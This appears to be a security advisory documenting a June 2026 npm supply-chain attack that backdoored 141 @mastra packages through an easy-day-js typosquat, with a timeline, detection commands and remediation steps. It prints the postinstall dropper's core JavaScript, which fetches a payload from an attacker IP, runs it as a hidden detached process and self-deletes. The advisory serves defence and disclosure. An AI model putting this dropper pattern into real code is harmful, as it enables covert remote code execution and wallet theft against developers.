# Mastra npm Supply Chain Attack — 141 Packages Backdoored via easy-day-js Typosquat

**Date:** June 2026
**Ecosystem:** npm
**Severity:** Critical
**Type:** Dependency Injection / Typosquat / Crypto Wallet Stealer / Remote Access Trojan
**Sources:**
- [Aikido — Over 140 popular Mastra npm Packages Hit by Supply Chain Attack](https://www.aikido.dev/blog/over-140-popular-mastra-npm-packages-hit-by-supply-chain-attack)
- [StepSecurity — Mastra npm Supply Chain Attack: 140+ Packages Backdoored via easy-day-js Typosquat](https://www.stepsecurity.io/blog/mastra-npm-packages-compromised-using-easy-day-js)

---

## Summary

On June 17, 2026, Aikido Security detected a large-scale supply chain attack targeting the entire `@mastra` npm scope — a popular open-source AI agent framework with hundreds of packages. An attacker republished 141 packages in a burst between 01:15 and 02:00 UTC, silently injecting a malicious dependency (`easy-day-js`) into every one of them. The affected packages include `@mastra/core` (918K weekly downloads), `mastra`, and `create-mastra`.

The attack used a two-stage decoy-then-weaponize technique: the attacker first published a clean version of `easy-day-js` (a typosquat of `dayjs`) at v1.11.21, then followed with a malicious v1.11.22. The compromised `@mastra` packages pin `^1.11.21`, so npm's caret semver resolution automatically pulled in v1.11.22, while dependency auditing against the pinned version showed nothing suspicious.

The playbook is nearly identical to the March 2026 axios compromise: an attacker-controlled dependency is injected (avoiding direct modification of the target package), the dependency self-deletes after execution, and C2 infrastructure runs on Hostwinds VPS on port 8000. The second-stage payload targets over 160 browser-based crypto wallet extensions including MetaMask, Keplr, and Coinbase, with cross-platform persistence on macOS, Windows, and Linux.

---

## Compromised Artifacts

| Package | Malicious Version |
|---------|------------------|
| `easy-day-js` | 1.11.22 (root malicious dependency) |
| `mastra` | 1.13.1 |
| `create-mastra` | 1.13.1 |
| `@mastra/core` | 1.42.1 |
| `@mastra/acp` | 0.2.2 |
| `@mastra/agent-browser` | 0.3.2 |
| `@mastra/agent-builder` | 1.0.42 |
| `@mastra/agentcore` | 0.2.2 |
| `@mastra/agentfs` | 0.1.1 |
| `@mastra/ai-sdk` | 1.4.6 |
| `@mastra/auth` | 1.0.3 |
| `@mastra/client-js` | 1.24.1 |
| `@mastra/deployer` | 1.42.1 |
| `@mastra/memory` | 1.20.4 |
| `@mastra/mcp` | 1.10.1 |
| `@mastra/rag` | 2.2.2 |
| `@mastra/server` | 2.1.1 |
| `@mastra/playground-ui` | 33.0.1 |
| *(+ 123 additional `@mastra/*` packages)* | various |

All 141 compromised packages were published within a ~45-minute window on June 17, 2026.

---

## How It Worked

### Stage 1: Typosquat Staging

The attacker published `easy-day-js` under a separate account several days before the main attack:
- **v1.11.21**: Clean copy of `dayjs` with no install hooks — passed any dependency audit
- **v1.11.22**: Identical to v1.11.21 except it adds a `postinstall` script running `setup.cjs`

### Stage 2: @mastra Scope Takeover

The attacker gained write access to the `@mastra` npm organization and republished all 141 packages with a single addition to each `package.json`: `"easy-day-js": "^1.11.21"`. Because the caret range resolves to the latest compatible version, npm installs v1.11.22.

### Stage 3: Postinstall Dropper

`setup.cjs` (obfuscated) performs:

```javascript
// Simplified essential logic
const payload = await (await fetch('https://23.254.164.92:8000/update/49890878')).text();
const file = path.join(os.tmpdir(), crypto.randomBytes(12).toString('hex') + '.js');
fs.writeFileSync(file, payload, 'utf8');
child_process.spawn(process.execPath, [file, '23.254.164.123:443'], {
  detached: true, stdio: 'ignore', windowsHide: true
}).unref();
fs.rmSync(__filename, { force: true }); // self-deletes
```

1. Fetches second-stage payload from C2 at `23.254.164.92:8000`
2. Writes to a randomly named `.js` file in the OS temp directory
3. Spawns as a fully detached, invisible background process with a second C2 host as an argument
4. Self-deletes to remove forensic evidence

### Stage 4: Second-Stage RAT

The second-stage payload runs as a persistent background process. It:
- Collects system information
- Targets 160+ browser-based crypto wallet extensions (MetaMask, Keplr, Coinbase, etc.)
- Establishes persistence disguised as node-related tools on macOS, Windows, and Linux
- Phones home to `23.254.164.123:443`

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| ~Jun 16 | Attacker publishes `easy-day-js@1.11.21` (clean) |
| ~Jun 17, 01:00 | `easy-day-js@1.11.22` published with malicious `postinstall` |
| Jun 17, 01:15–02:00 | 141 `@mastra` packages republished with `easy-day-js` dependency injected |
| Jun 17 | Aikido Security detects and reports the attack |
| Jun 18 | Malicious packages removed from npm; `easy-day-js` taken down |

---

## Detection

```bash
# Check if easy-day-js is in your dependency tree
npm ls easy-day-js
cat package-lock.json | grep -A3 "easy-day-js"

# Check for compromised @mastra versions (v1.13.1 range)
npm ls @mastra/core | grep "1\.42\.1\|1\.13\."
npm ls mastra | grep "1\.13\."

# Check for suspicious detached node processes
ps aux | grep -E "node.*\.js" | grep -v grep

# Check temp directory for randomly-named JS files
ls /tmp/*.js 2>/dev/null
ls $TMPDIR/*.js 2>/dev/null

# Check for outbound connections to C2 IPs
netstat -an | grep -E "23\.254\.164\.(92|123)"
lsof -i @23.254.164.92
lsof -i @23.254.164.123

# Scan package-lock.json for easy-day-js injection
grep -r "easy-day-js" node_modules/ package-lock.json
```

---

## Remediation

1. Run `npm ls easy-day-js` — if present, the payload may have already executed
2. Delete `node_modules` and `package-lock.json`, then re-run `npm install` after the packages are cleaned up
3. Check your OS temp directory (`/tmp/`, `%TEMP%`, `$TMPDIR`) for randomly named `.js` files from around the install time
4. Rotate all credentials accessible on the affected machine: cloud API keys, SSH keys, npm tokens, wallet seed phrases, browser sessions
5. Check for persistent node processes disguised as system tools and kill any suspicious ones
6. Rebuild CI runners that installed affected `@mastra` package versions — assume full credential compromise
7. Audit browser extension crypto wallets for unexpected transactions

---

## Lessons Learned

- **Caret semver ranges are a supply chain attack surface**: `^x.y.z` silently pulls in new patch/minor versions. Pinning exact versions or using lock files only partially mitigates this — lock files must be committed and honored in CI.
- **Dependency injection avoids source diff detection**: By not touching the target package's code, the attacker bypassed code review and diff-based detection.
- **Clean decoy versions build false trust**: Publishing a clean version first defeats audit tools that only check the version pinned in `package.json`.
- **Scope-level compromise is a force multiplier**: Gaining access to a single npm organization account can poison hundreds of packages simultaneously.
- **Self-deleting payloads erase forensic evidence**: The dropper removes itself after execution, making post-incident analysis harder.

---

## Related Incidents

- [2026-03-axios-npm-rat.md](./2026-03-axios-npm-rat.md) — Nearly identical playbook: malicious dependency injection via `plain-crypto-js`, same Hostwinds VPS infrastructure, self-deleting dropper
- [2026-04-fake-tanstack-npm.md](./2026-04-fake-tanstack-npm.md) — Typosquatting + postinstall credential theft pattern
- [2026-05-trapdoor-npm-pypi-crates.md](./2026-05-trapdoor-npm-pypi-crates.md) — Multi-ecosystem scope compromise targeting AI frameworks
